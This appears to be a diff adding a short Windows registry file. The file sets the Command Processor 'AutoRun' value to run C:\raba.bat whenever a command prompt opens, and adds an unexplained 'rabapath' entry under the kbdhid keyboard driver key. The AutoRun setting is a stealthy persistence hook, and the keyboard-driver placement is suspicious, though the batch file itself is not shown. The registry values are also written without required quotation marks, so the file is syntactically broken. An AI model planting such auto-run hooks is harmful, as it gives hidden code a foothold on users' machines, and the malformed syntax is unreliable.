@@ -1,0 +1,5 @@
+Windows Registry Editor Version 5.00
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\kbdhid\Parameters]
+"rabapath"=C:\Users\Lenovo\Raba
+[HKEY_CURRENT_USER\Software\Microsoft\Command Processor]
+"AutoRun"=C:\raba.bat
